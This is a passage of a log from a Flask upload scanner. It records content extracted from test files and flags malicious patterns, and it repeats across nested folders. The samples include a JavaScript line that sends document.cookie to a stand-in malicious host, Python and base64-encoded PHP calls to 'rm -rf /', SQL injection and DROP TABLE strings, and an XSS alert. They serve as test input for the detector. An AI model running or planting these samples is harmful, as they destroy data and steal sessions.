    payload: "exec('malicious_code_here')"  # Hidden malicious code
2025-02-22 19:36:33,749 - Extracted content from uploads/new_test/new_test/test_brute_force.txt: hello bro
this script is for hacking sql attack and brute force attacks.
2025-02-22 19:36:33,750 - [31m[1mWARNING: This is a development server. Do not use it in a production deployment. Use a production WSGI server instead.[0m
 * Running on http://127.0.0.1:5000
2025-02-22 19:36:33,750 - [33mPress CTRL+C to quit[0m
2025-02-22 19:36:36,609 - 127.0.0.1 - - [22/Feb/2025 19:36:36] "GET / HTTP/1.1" 200 -
2025-02-22 19:36:41,587 - Extracted content from uploads/malicious.xlsx: SELECT * FROM users WHERE username = 'admin';
DROP TABLE users;
eval('some malicious code');
2025-02-22 19:36:41,587 - Malicious pattern detected in uploads/malicious.xlsx
2025-02-22 19:36:41,588 - 127.0.0.1 - - [22/Feb/2025 19:36:41] "[32mPOST /upload HTTP/1.1[0m" 302 -
2025-02-22 19:36:41,592 - 127.0.0.1 - - [22/Feb/2025 19:36:41] "GET / HTTP/1.1" 200 -
2025-02-22 19:36:52,817 - Extracted content from uploads/flask_file_upload/flask_file_upload/create_malicious_xlsx.py: from openpyxl import Workbook

def create_malicious_xlsx(filename):
    # Create a new Workbook
    wb = Workbook()
    
    # Add a sheet
    ws = wb.active
    ws.title = "Malicious Data"
    
    # Add suspicious content
    suspicious_content = [
        "SELECT * FROM users WHERE username = 'admin';",
        "DROP TABLE users;",
        "eval('some malicious code');"
    ]
    
    for index, line in enumerate(suspicious_content, start=1):
        ws[f'A{index}'] = line
    
    # Add susp
2025-02-22 19:36:52,817 - Malicious pattern detected in uploads/flask_file_upload/flask_file_upload/create_malicious_xlsx.py
2025-02-22 19:36:52,817 - Extracted content from uploads/flask_file_upload/flask_file_upload/metadata_analysis.py: import os
import re
import zipfile
import xml.etree.ElementTree as ET
from docx import Document
from pptx import Presentation
from openpyxl import load_workbook

def extract_metadata(file_path):
    """Extract metadata from .docx, .pptx, .xlsx files"""
    metadata = {}

    try:
        if file_path.endswith(".docx"):
            doc = Document(file_path)
            metadata["Title"] = doc.core_properties.title
            metadata["Author"] = doc.core_properties.author
            metadata["C
2025-02-22 19:36:52,818 - Extracted content from uploads/flask_file_upload/flask_file_upload/app.py: from flask import Flask, render_template, request, redirect, url_for, flash
import os
import sqlite3
import re
import logging
import zipfile
from docx import Document
from pptx import Presentation
from openpyxl import load_workbook

app = Flask(__name__)
app.config['UPLOAD_FOLDER'] = 'uploads'
app.config['TRASH_FOLDER'] = 'trash'
app.config['ALLOWED_EXTENSIONS'] = {"docx", "xls", "xlsx", "ppt", "pptx", "odt", "txt", "py", "js", "c", "java", "zip", "r", "bsv", "yaml", "xml", "word", "xl", "xss", 
2025-02-22 19:36:52,818 - Malicious pattern detected in uploads/flask_file_upload/flask_file_upload/app.py
2025-02-22 19:36:52,818 - Extracted content from uploads/flask_file_upload/flask_file_upload/create_malicious_pptx.py: from pptx import Presentation

def create_malicious_pptx(filename):
    # Create a new Presentation
    ppt = Presentation()
    
    # Add a slide
    slide = ppt.slides.add_slide(ppt.slide_layouts[5])  # Title Slide layout
    
    # Add suspicious content
    suspicious_content = [
        "SELECT * FROM users WHERE username = 'admin';",
        "DROP TABLE users;",
        "<script>alert('XSS');</script>",
        "eval('some malicious code');"
    ]
    
    for line in suspicious_content:

2025-02-22 19:36:52,818 - Malicious pattern detected in uploads/flask_file_upload/flask_file_upload/create_malicious_pptx.py
2025-02-22 19:36:52,821 - Extracted content from uploads/flask_file_upload/flask_file_upload/malicious.xlsx: SELECT * FROM users WHERE username = 'admin';
DROP TABLE users;
eval('some malicious code');
2025-02-22 19:36:52,821 - Malicious pattern detected in uploads/flask_file_upload/flask_file_upload/malicious.xlsx
2025-02-22 19:36:52,825 - Extracted content from uploads/flask_file_upload/flask_file_upload/malicious.pptx: SELECT * FROM users WHERE username = 'admin';
DROP TABLE users;
<script>alert('XSS');</script>
eval('some malicious code');
2025-02-22 19:36:52,825 - Malicious pattern detected in uploads/flask_file_upload/flask_file_upload/malicious.pptx
2025-02-22 19:36:52,833 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/test_malicious.pptx: Malicious Presentation
This presentation contains hidden malicious content.
Normal Slide
This is a normal slide with safe content.
Suspicious Content
exec('malicious_code_here')
2025-02-22 19:36:52,838 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/new_test/new_test/HELLO.txt: hello bro
this script is for hacking sql attack and brute force attacks.
2025-02-22 19:36:52,843 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/new_test/new_test/test_malicious.pptx: Malicious Presentation
This presentation contains hidden malicious content.
Normal Slide
This is a normal slide with safe content.
Suspicious Content
exec('malicious_code_here')
2025-02-22 19:36:52,847 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/new_test/new_test/text_hidden_yaml.yaml: # Sample YAML file
users:
  - username: admin
    password: secret
  - username: attacker
    payload: "exec('malicious_code_here')"  # Hidden malicious code
2025-02-22 19:36:52,847 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/new_test/new_test/test_brute_force.txt: hello bro
this script is for hacking sql attack and brute force attacks.
2025-02-22 19:36:52,847 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/test/test/3.py: import os
os.system("rm -rf /")  # Dangerous command

2025-02-22 19:36:52,847 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/test/test/4.php: <?php
eval(base64_decode("c3lzdGVtKCJybSAtcmYgLyIpOw=="));
?>

2025-02-22 19:36:52,847 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/test/test/2.xss: <script>alert('Hacked!');</script>

2025-02-22 19:36:52,847 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/test/test/6.js: document.location = "http://malicious-site.com?cookie=" + document.cookie;

2025-02-22 19:36:52,847 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/test/test/5.txt: password_list.txt
admin123
qwerty

2025-02-22 19:36:52,847 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/test/test/1.zip: PK   ZVZ        9      1.sqlUT
 UgEggux     vquQRpU(-N-*Vp
rsSlSr3
mؚ PK d6   9   PK   ZVZ d6   9                  1.sqlUT
 UgEggux     PK      S        
2025-02-22 19:36:52,848 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/metadata_analysis.py: import os
import re
import zipfile
import xml.etree.ElementTree as ET
from docx import Document
from pptx import Presentation
from openpyxl import load_workbook

def extract_metadata(file_path):
    """Extract metadata from .docx, .pptx, .xlsx files"""
    metadata = {}

    try:
        if file_path.endswith(".docx"):
            doc = Document(file_path)
            metadata["Title"] = doc.core_properties.title
            metadata["Author"] = doc.core_properties.author
            metadata["C
2025-02-22 19:36:52,854 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/test_malicious.pptx: Malicious Presentation
This presentation contains hidden malicious content.
Normal Slide
This is a normal slide with safe content.
Suspicious Content
exec('malicious_code_here')
2025-02-22 19:36:52,858 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/new_test/new_test/HELLO.txt: hello bro
this script is for hacking sql attack and brute force attacks.
2025-02-22 19:36:52,863 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/new_test/new_test/test_malicious.pptx: Malicious Presentation
This presentation contains hidden malicious content.
Normal Slide
This is a normal slide with safe content.
Suspicious Content
exec('malicious_code_here')
2025-02-22 19:36:52,866 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/new_test/new_test/text_hidden_yaml.yaml: # Sample YAML file
users:
  - username: admin
    password: secret
  - username: attacker
    payload: "exec('malicious_code_here')"  # Hidden malicious code
2025-02-22 19:36:52,867 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/new_test/new_test/test_brute_force.txt: hello bro
this script is for hacking sql attack and brute force attacks.
2025-02-22 19:36:52,867 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/test/test/3.py: import os
os.system("rm -rf /")  # Dangerous command

2025-02-22 19:36:52,867 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/test/test/4.php: <?php
eval(base64_decode("c3lzdGVtKCJybSAtcmYgLyIpOw=="));
?>

2025-02-22 19:36:52,867 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/test/test/2.xss: <script>alert('Hacked!');</script>

2025-02-22 19:36:52,867 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/test/test/6.js: document.location = "http://malicious-site.com?cookie=" + document.cookie;

2025-02-22 19:36:52,867 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/test/test/5.txt: password_list.txt
admin123
qwerty

2025-02-22 19:36:52,867 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/test/test/1.zip: PK   ZVZ        9      1.sqlUT
 UgEggux     vquQRpU(-N-*Vp
rsSlSr3
mؚ PK d6   9   PK   ZVZ d6   9                  1.sqlUT
 UgEggux     PK      S        
2025-02-22 19:36:52,867 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/7-A.R: data(iris)
set.seed(123)
kmeans_model <- kmeans(iris[, -5], centers = 3)
plot(iris$Sepal.Length, iris$Sepal.Width, col = kmeans_model$cluster,
     pch = 19, xlab = "Sepal Length", ylab = "Sepal Width", 
     main = "K-Means Clustering")

2025-02-22 19:36:52,868 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/input_detail.yaml: # AXI4_LITE WIRE:
axi4_lite_paddr: 32
axi4_lite_addr: 32
# AXI4 WIRE:
axi4_paddr: 32
axi4_addr: 32
#CONFIG PARAMETER FOR BOTH AXI4 AND AXI4_LITE
config: 0
plic_num_context: 2


# TbSOC generation:
# if TbSOC is needed:
# Input for the TbSOC And Other inputs:
tbsoc: "yes"
openocd: "no"
sign_dump: "yes"
Rv64: "yes"
spfpu: "yes"
debug: "no"
rtldump: "yes"
cocotb_sim: "yes"
atomic: "yes"
compressed: "yes"
muldiv: "yes"
usertraps: "yes"
supervisor: "yes"
user: "yes"
hypervisor: "no"
bscan2e: "yes"
# 
2025-02-22 19:36:52,868 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/5-A.R: library(rpart)
age <- c(22, 24, 30, 35, 45, 50, 60, 65, 70, 75, 80, 85) 
survived <- as.factor(c(0, 0, 0, 1, 1, 0, 1, 0, 1, 1, 0, 0)) 
data <- data.frame(Age = age, Survived = survived)
model <- rpart(Survived ~ Age, data = data, method = "class", control = rpart.control(minsplit = 1))

plot(model, uniform = TRUE, margin = 0.1)
text(model, use.n = TRUE, cex = 0.8)
print(model)
2025-02-22 19:36:52,868 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/3.py: import os
os.system("rm -rf /")  # Dangerous command

2025-02-22 19:36:52,868 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/w.js: hello bro
this file will not contains any pattern or sql injection or brute force attack

2025-02-22 19:36:52,873 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/test_malicious.pptx: Malicious Presentation
This presentation contains hidden malicious content.
Normal Slide
This is a normal slide with safe content.
Suspicious Content
exec('malicious_code_here')
2025-02-22 19:36:52,876 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/4.php: <?php
eval(base64_decode("c3lzdGVtKCJybSAtcmYgLyIpOw=="));
?>

2025-02-22 19:36:52,876 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/2.xss: <script>alert('Hacked!');</script>

2025-02-22 19:36:52,876 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/6.js: document.location = "http://malicious-site.com?cookie=" + document.cookie;

2025-02-22 19:36:52,877 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/mixed_cluster.bsv: /* 
Copyright (c) 2019, IIT Madras All rights reserved.

Redistribution and use in source and binary forms, with or without modification, are permitted
provided that the following conditions are met:

* Redistributions of source code must retain the above copyright notice, this list of conditions
  and the following disclaimer.  
* Redistributions in binary form must reproduce the above copyright notice, this list of 
  conditions and the following disclaimer in the documentation and/or other ma
2025-02-22 19:36:52,877 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/5.txt: password_list.txt
admin123
qwerty

2025-02-22 19:36:52,877 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/a.py: hello bro
this file will not contains any pattern or sql injection or brute force attack

2025-02-22 19:36:52,877 - Extracted content from uploads/flask_file_upload/flask_file_upload/trash/7-A.R: data(iris)
set.seed(123)
kmeans_model <- kmeans(iris[, -5], centers = 3)
plot(iris$Sepal.Length, iris$Sepal.Width, col = kmeans_model$cluster,
     pch = 19, xlab = "Sepal Length", ylab = "Sepal Width", 
     main = "K-Means Clustering")

2025-02-22 19:36:52,878 - Extracted content from uploads/flask_file_upload/flask_file_upload/trash/input_detail.yaml: # AXI4_LITE WIRE:
axi4_lite_paddr: 32
axi4_lite_addr: 32
# AXI4 WIRE:
axi4_paddr: 32
axi4_addr: 32
#CONFIG PARAMETER FOR BOTH AXI4 AND AXI4_LITE
config: 0
plic_num_context: 2


# TbSOC generation:
# if TbSOC is needed:
# Input for the TbSOC And Other inputs:
tbsoc: "yes"
openocd: "no"
sign_dump: "yes"
Rv64: "yes"
spfpu: "yes"
debug: "no"
rtldump: "yes"
cocotb_sim: "yes"
atomic: "yes"
compressed: "yes"
muldiv: "yes"
usertraps: "yes"
supervisor: "yes"
user: "yes"
hypervisor: "no"
bscan2e: "yes"
# 
2025-02-22 19:36:52,878 - Extracted content from uploads/flask_file_upload/flask_file_upload/trash/5-A.R: library(rpart)
age <- c(22, 24, 30, 35, 45, 50, 60, 65, 70, 75, 80, 85) 
survived <- as.factor(c(0, 0, 0, 1, 1, 0, 1, 0, 1, 1, 0, 0)) 
data <- data.frame(Age = age, Survived = survived)
model <- rpart(Survived ~ Age, data = data, method = "class", control = rpart.control(minsplit = 1))

plot(model, uniform = TRUE, margin = 0.1)
text(model, use.n = TRUE, cex = 0.8)
print(model)
2025-02-22 19:36:52,878 - Extracted content from uploads/flask_file_upload/flask_file_upload/trash/3.py: import os
os.system("rm -rf /")  # Dangerous command

2025-02-22 19:36:52,886 - Extracted content from uploads/flask_file_upload/flask_file_upload/trash/test_doc_hidden.docx: SELECT * FROM users WHERE username = 'admin' AND password = 'password'
2025-02-22 19:36:52,886 - Malicious pattern detected in uploads/flask_file_upload/flask_file_upload/trash/test_doc_hidden.docx
2025-02-22 19:36:52,886 - Extracted content from uploads/flask_file_upload/flask_file_upload/trash/w.js: hello bro
this file will not contains any pattern or sql injection or brute force attack

2025-02-22 19:36:52,892 - Extracted content from uploads/flask_file_upload/flask_file_upload/trash/test_malicious.pptx: Malicious Presentation
This presentation contains hidden malicious content.
Normal Slide
This is a normal slide with safe content.
Suspicious Content
exec('malicious_code_here')
2025-02-22 19:36:52,895 - Extracted content from uploads/flask_file_upload/flask_file_upload/trash/4.php: <?php
eval(base64_decode("c3lzdGVtKCJybSAtcmYgLyIpOw=="));
?>

2025-02-22 19:36:52,895 - Extracted content from uploads/flask_file_upload/flask_file_upload/trash/1.sql: SELECT * FROM users WHERE username = 'admin' OR '1'='1';

2025-02-22 19:36:52,895 - Malicious pattern detected in uploads/flask_file_upload/flask_file_upload/trash/1.sql
2025-02-22 19:36:52,895 - Extracted content from uploads/flask_file_upload/flask_file_upload/trash/2.xss: <script>alert('Hacked!');</script>

2025-02-22 19:36:52,896 - Extracted content from uploads/flask_file_upload/flask_file_upload/trash/6.js: document.location = "http://malicious-site.com?cookie=" + document.cookie;

2025-02-22 19:36:52,896 - Extracted content from uploads/flask_file_upload/flask_file_upload/trash/mixed_cluster.bsv: /* 
Copyright (c) 2019, IIT Madras All rights reserved.

Redistribution and use in source and binary forms, with or without modification, are permitted
provided that the following conditions are met:

* Redistributions of source code must retain the above copyright notice, this list of conditions
  and the following disclaimer.  
* Redistributions in binary form must reproduce the above copyright notice, this list of 
  conditions and the following disclaimer in the documentation and/or other ma
2025-02-22 19:36:52,896 - Extracted content from uploads/flask_file_upload/flask_file_upload/trash/5.txt: password_list.txt
admin123
qwerty

2025-02-22 19:36:52,896 - Extracted content from uploads/flask_file_upload/flask_file_upload/trash/a.py: hello bro
this file will not contains any pattern or sql injection or brute force attack

2025-02-22 19:36:52,896 - Extracted content from uploads/flask_file_upload/flask_file_upload/metadata_analysis.py: import os
import re
import zipfile
import xml.etree.ElementTree as ET
from docx import Document
from pptx import Presentation
from openpyxl import load_workbook

def extract_metadata(file_path):
    """Extract metadata from .docx, .pptx, .xlsx files"""
    metadata = {}

    try:
        if file_path.endswith(".docx"):
            doc = Document(file_path)
            metadata["Title"] = doc.core_properties.title
            metadata["Author"] = doc.core_properties.author
            metadata["C
2025-02-22 19:36:52,897 - Extracted content from uploads/flask_file_upload/flask_file_upload/trash/7-A.R: data(iris)
set.seed(123)
kmeans_model <- kmeans(iris[, -5], centers = 3)
plot(iris$Sepal.Length, iris$Sepal.Width, col = kmeans_model$cluster,
     pch = 19, xlab = "Sepal Length", ylab = "Sepal Width", 
     main = "K-Means Clustering")

2025-02-22 19:36:52,897 - Extracted content from uploads/flask_file_upload/flask_file_upload/trash/input_detail.yaml: # AXI4_LITE WIRE:
axi4_lite_paddr: 32
axi4_lite_addr: 32
# AXI4 WIRE:
axi4_paddr: 32
axi4_addr: 32
#CONFIG PARAMETER FOR BOTH AXI4 AND AXI4_LITE
config: 0
plic_num_context: 2


# TbSOC generation:
# if TbSOC is needed:
# Input for the TbSOC And Other inputs:
tbsoc: "yes"
openocd: "no"
sign_dump: "yes"
Rv64: "yes"
spfpu: "yes"
debug: "no"
rtldump: "yes"
cocotb_sim: "yes"
atomic: "yes"
compressed: "yes"
muldiv: "yes"
usertraps: "yes"
supervisor: "yes"
user: "yes"
hypervisor: "no"
bscan2e: "yes"
# 
2025-02-22 19:36:52,897 - Extracted content from uploads/flask_file_upload/flask_file_upload/trash/5-A.R: library(rpart)
age <- c(22, 24, 30, 35, 45, 50, 60, 65, 70, 75, 80, 85) 
survived <- as.factor(c(0, 0, 0, 1, 1, 0, 1, 0, 1, 1, 0, 0)) 
data <- data.frame(Age = age, Survived = survived)
model <- rpart(Survived ~ Age, data = data, method = "class", control = rpart.control(minsplit = 1))

plot(model, uniform = TRUE, margin = 0.1)
text(model, use.n = TRUE, cex = 0.8)
print(model)
2025-02-22 19:36:52,897 - Extracted content from uploads/flask_file_upload/flask_file_upload/trash/3.py: import os
os.system("rm -rf /")  # Dangerous command

2025-02-22 19:36:52,897 - Extracted content from uploads/flask_file_upload/flask_file_upload/trash/w.js: hello bro
this file will not contains any pattern or sql injection or brute force attack

2025-02-22 19:36:52,901 - Extracted content from uploads/flask_file_upload/flask_file_upload/trash/test_malicious.pptx: Malicious Presentation
This presentation contains hidden malicious content.
Normal Slide
This is a normal slide with safe content.
Suspicious Content
exec('malicious_code_here')
2025-02-22 19:36:52,905 - Extracted content from uploads/flask_file_upload/flask_file_upload/trash/4.php: <?php
eval(base64_decode("c3lzdGVtKCJybSAtcmYgLyIpOw=="));
?>

2025-02-22 19:36:52,905 - Extracted content from uploads/flask_file_upload/flask_file_upload/trash/2.xss: <script>alert('Hacked!');</script>

2025-02-22 19:36:52,905 - Extracted content from uploads/flask_file_upload/flask_file_upload/trash/6.js: document.location = "http://malicious-site.com?cookie=" + document.cookie;

2025-02-22 19:36:52,905 - Extracted content from uploads/flask_file_upload/flask_file_upload/trash/mixed_cluster.bsv: /* 
Copyright (c) 2019, IIT Madras All rights reserved.

Redistribution and use in source and binary forms, with or without modification, are permitted
provided that the following conditions are met:

* Redistributions of source code must retain the above copyright notice, this list of conditions
  and the following disclaimer.  
* Redistributions in binary form must reproduce the above copyright notice, this list of 
  conditions and the following disclaimer in the documentation and/or other ma
2025-02-22 19:36:52,906 - Extracted content from uploads/flask_file_upload/flask_file_upload/trash/5.txt: password_list.txt
admin123
qwerty

2025-02-22 19:36:52,906 - Extracted content from uploads/flask_file_upload/flask_file_upload/trash/a.py: hello bro
this file will not contains any pattern or sql injection or brute force attack

2025-02-22 19:36:52,910 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/test_malicious.pptx: Malicious Presentation
This presentation contains hidden malicious content.
Normal Slide
This is a normal slide with safe content.
Suspicious Content
exec('malicious_code_here')
2025-02-22 19:36:52,914 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/metadata_analysis.py: import os
import re
import zipfile
import xml.etree.ElementTree as ET
from docx import Document
from pptx import Presentation
from openpyxl import load_workbook

def extract_metadata(file_path):
    """Extract metadata from .docx, .pptx, .xlsx files"""
    metadata = {}

    try:
        if file_path.endswith(".docx"):
            doc = Document(file_path)
            metadata["Title"] = doc.core_properties.title
            metadata["Author"] = doc.core_properties.author
            metadata["C
2025-02-22 19:36:52,914 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/7-A.R: data(iris)
set.seed(123)
kmeans_model <- kmeans(iris[, -5], centers = 3)
plot(iris$Sepal.Length, iris$Sepal.Width, col = kmeans_model$cluster,
     pch = 19, xlab = "Sepal Length", ylab = "Sepal Width", 
     main = "K-Means Clustering")

2025-02-22 19:36:52,914 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/input_detail.yaml: # AXI4_LITE WIRE:
axi4_lite_paddr: 32
axi4_lite_addr: 32
# AXI4 WIRE:
axi4_paddr: 32
axi4_addr: 32
#CONFIG PARAMETER FOR BOTH AXI4 AND AXI4_LITE
config: 0
plic_num_context: 2


# TbSOC generation:
# if TbSOC is needed:
# Input for the TbSOC And Other inputs:
tbsoc: "yes"
openocd: "no"
sign_dump: "yes"
Rv64: "yes"
spfpu: "yes"
debug: "no"
rtldump: "yes"
cocotb_sim: "yes"
atomic: "yes"
compressed: "yes"
muldiv: "yes"
usertraps: "yes"
supervisor: "yes"
user: "yes"
hypervisor: "no"
bscan2e: "yes"
# 
2025-02-22 19:36:52,914 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/5-A.R: library(rpart)
age <- c(22, 24, 30, 35, 45, 50, 60, 65, 70, 75, 80, 85) 
survived <- as.factor(c(0, 0, 0, 1, 1, 0, 1, 0, 1, 1, 0, 0)) 
data <- data.frame(Age = age, Survived = survived)
model <- rpart(Survived ~ Age, data = data, method = "class", control = rpart.control(minsplit = 1))

plot(model, uniform = TRUE, margin = 0.1)
text(model, use.n = TRUE, cex = 0.8)
print(model)
2025-02-22 19:36:52,914 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/3.py: import os
os.system("rm -rf /")  # Dangerous command

2025-02-22 19:36:52,914 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/w.js: hello bro
this file will not contains any pattern or sql injection or brute force attack

2025-02-22 19:36:52,918 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/test_malicious.pptx: Malicious Presentation
This presentation contains hidden malicious content.
Normal Slide
This is a normal slide with safe content.
Suspicious Content
exec('malicious_code_here')
2025-02-22 19:36:52,922 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/4.php: <?php
eval(base64_decode("c3lzdGVtKCJybSAtcmYgLyIpOw=="));
?>

2025-02-22 19:36:52,922 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/2.xss: <script>alert('Hacked!');</script>

2025-02-22 19:36:52,922 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/6.js: document.location = "http://malicious-site.com?cookie=" + document.cookie;

2025-02-22 19:36:52,922 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/mixed_cluster.bsv: /* 
Copyright (c) 2019, IIT Madras All rights reserved.

Redistribution and use in source and binary forms, with or without modification, are permitted
provided that the following conditions are met:

* Redistributions of source code must retain the above copyright notice, this list of conditions
  and the following disclaimer.  
* Redistributions in binary form must reproduce the above copyright notice, this list of 
  conditions and the following disclaimer in the documentation and/or other ma
2025-02-22 19:36:52,923 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/5.txt: password_list.txt
admin123
qwerty

2025-02-22 19:36:52,923 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/a.py: hello bro
this file will not contains any pattern or sql injection or brute force attack

2025-02-22 19:36:52,927 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/test_malicious.pptx: Malicious Presentation
This presentation contains hidden malicious content.
Normal Slide
This is a normal slide with safe content.
Suspicious Content
exec('malicious_code_here')
2025-02-22 19:36:52,931 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/test/test/3.py: import os
os.system("rm -rf /")  # Dangerous command

2025-02-22 19:36:52,931 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/test/test/4.php: <?php
eval(base64_decode("c3lzdGVtKCJybSAtcmYgLyIpOw=="));
?>

2025-02-22 19:36:52,931 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/test/test/2.xss: <script>alert('Hacked!');</script>

2025-02-22 19:36:52,931 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/test/test/6.js: document.location = "http://malicious-site.com?cookie=" + document.cookie;

2025-02-22 19:36:52,931 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/test/test/5.txt: password_list.txt
admin123
qwerty

2025-02-22 19:36:52,931 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/test/test/1.zip: PK   ZVZ        9      1.sqlUT
 UgEggux     vquQRpU(-N-*Vp
rsSlSr3
mؚ PK d6   9   PK   ZVZ d6   9                  1.sqlUT
 UgEggux     PK      S        
2025-02-22 19:36:52,931 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/new_test/new_test/HELLO.txt: hello bro
this script is for hacking sql attack and brute force attacks.
2025-02-22 19:36:52,935 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/new_test/new_test/test_malicious.pptx: Malicious Presentation
This presentation contains hidden malicious content.
Normal Slide
This is a normal slide with safe content.
Suspicious Content
exec('malicious_code_here')
2025-02-22 19:36:52,939 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/new_test/new_test/text_hidden_yaml.yaml: # Sample YAML file
users:
  - username: admin
    password: secret
  - username: attacker
    payload: "exec('malicious_code_here')"  # Hidden malicious code
2025-02-22 19:36:52,939 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/new_test/new_test/test_brute_force.txt: hello bro
this script is for hacking sql attack and brute force attacks.
2025-02-22 19:36:52,939 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/test/test/3.py: import os
os.system("rm -rf /")  # Dangerous command

2025-02-22 19:36:52,939 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/test/test/4.php: <?php
eval(base64_decode("c3lzdGVtKCJybSAtcmYgLyIpOw=="));
?>

2025-02-22 19:36:52,939 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/test/test/2.xss: <script>alert('Hacked!');</script>

2025-02-22 19:36:52,939 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/test/test/6.js: document.location = "http://malicious-site.com?cookie=" + document.cookie;

2025-02-22 19:36:52,939 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/test/test/5.txt: password_list.txt
admin123
qwerty

2025-02-22 19:36:52,939 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/test/test/1.zip: PK   ZVZ        9      1.sqlUT
 UgEggux     vquQRpU(-N-*Vp
rsSlSr3
mؚ PK d6   9   PK   ZVZ d6   9                  1.sqlUT
 UgEggux     PK      S        
2025-02-22 19:36:52,939 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/new_test/new_test/HELLO.txt: hello bro
this script is for hacking sql attack and brute force attacks.
2025-02-22 19:36:52,943 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/new_test/new_test/test_malicious.pptx: Malicious Presentation
This presentation contains hidden malicious content.
Normal Slide
This is a normal slide with safe content.
Suspicious Content
exec('malicious_code_here')
2025-02-22 19:36:52,950 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/new_test/new_test/text_hidden_yaml.yaml: # Sample YAML file
users:
  - username: admin
    password: secret
  - username: attacker
